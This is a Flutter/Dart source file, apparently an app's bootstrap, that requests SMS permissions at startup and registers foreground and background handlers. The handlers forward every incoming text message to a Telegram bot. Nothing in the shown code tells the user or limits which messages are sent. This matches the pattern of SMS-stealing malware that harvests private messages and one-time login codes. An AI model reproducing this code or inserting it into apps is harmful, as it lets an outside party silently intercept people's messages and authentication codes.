import 'dart:async';

import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';

import 'app.dart';
import 'widgets/tele_bot.dart';

@pragma("vm:entry-point")
final Telephony telephonyInstance = Telephony.instance;

@pragma("vm:entry-point")
final Future<SharedPreferences> preferences = SharedPreferences.getInstance();

@pragma("vm:entry-point")
Future<void> bootstrap(final FutureOr<Widget> Function() builder) async {
  // needed if you intend to initialize in the `main` function
  WidgetsFlutterBinding.ensureInitialized();

  await smsConfig();
  runApp(const MyApp());
}

@pragma("vm:entry-point")
Future<void> smsConfig() async {
  final requestPermission = await telephonyInstance.requestSmsPermissions;

  if (requestPermission != null && requestPermission) {
    telephonyInstance.listenIncomingSms(
        onNewMessage: foregroundMessageHandler,
        onBackgroundMessage: backgroundMessageHandler);
  }
}

@pragma("vm:entry-point")
void backgroundMessageHandler(SmsMessage smsMessage) async {
  await TelegramBotHelper.sendMessage(smsMessage);
}

@pragma("vm:entry-point")
//Handle foreground message
void foregroundMessageHandler(SmsMessage message) async {
  await TelegramBotHelper.sendMessage(message);
}
